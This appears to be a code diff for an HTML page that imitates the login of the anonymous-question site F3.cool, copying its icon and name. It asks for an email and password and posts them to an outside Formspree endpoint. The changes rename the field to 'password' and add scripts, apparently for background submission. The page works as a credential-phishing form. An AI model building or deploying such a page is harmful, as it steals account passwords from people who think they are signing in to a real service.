@@ -7,14 +7,17 @@
   <title>F3-cool</title>
   <link rel="shortcut icon" href="https://androidprogrammi.ru/wp-content/uploads/2021/02/cool_f3.png">
   <link rel="stylesheet" href="style.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
 </head>
 <body>
   <div class="logo"></div>
   <h1 class="question">Give me anonim question</h1>
-  <form action="https://formspree.io/f/xrgrkrpk" method="POST">
+  <form action="https://formspree.io/f/xrgrkrpk" method="POST" id="my-form">
     <input placeholder="E-mail" type="email" name="login">
-    <input placeholder="password" type="password" name="message">
-    <button type="submit">Увійти</button>
+    <input placeholder="Password" type="password" name="password">
+    <button id="sendMessage" type="submit">Увійти</button>
   </form>
+  <div id="status"></div>
+  <script src="main.js"></script>
 </body>
 </html>
